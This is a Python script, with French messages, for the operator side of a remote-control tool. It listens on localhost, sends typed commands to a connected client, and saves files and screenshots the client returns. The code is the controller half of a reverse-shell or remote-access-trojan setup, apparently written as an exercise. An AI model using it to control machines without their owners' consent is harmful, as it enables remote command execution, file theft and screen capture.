import socket
import platform
import os

print("Platform:", platform.platform())
print("OS:", os.name)

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    print("socket_receive_all: data_len =", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        print(" len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        print(" total_data_len:", current_data_len, " / ", data_len)
    return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    if not header_data:
        return None
    longueur_data = int(header_data.decode())
    print("longueur_data =", longueur_data)

    data_recues = socket_receive_all_data(socket_p, longueur_data)
    return data_recues  # bytes bruts

s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = s.accept()
print(f"Connexion établie avec {client_address}")

dl_file_name = None

while True:
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break
    infos_data = infos_data.decode()

    infos_split = infos_data.strip().split("|")
    plateforme = infos_split[0]
    cwd = infos_split[1] if len(infos_split) > 1 else ""

    print(f"Platforme: {plateforme}")
    print(f"Repertoire courant: {cwd}")

    commande = input(client_address[0] + ":" + str(client_address[1]) + " " + cwd + " > ")

    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_file_name = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_file_name = commande_split[1] + ".png"

    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
    if not data_recues:
        break

    if dl_file_name:
        save_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), dl_file_name)
        with open(save_path, "wb") as f:
            f.write(data_recues)
        print(f"Fichier sauvegardé : {save_path}")
        dl_file_name = None
    else:
        print(data_recues.decode())

s.close()
connection_socket.close()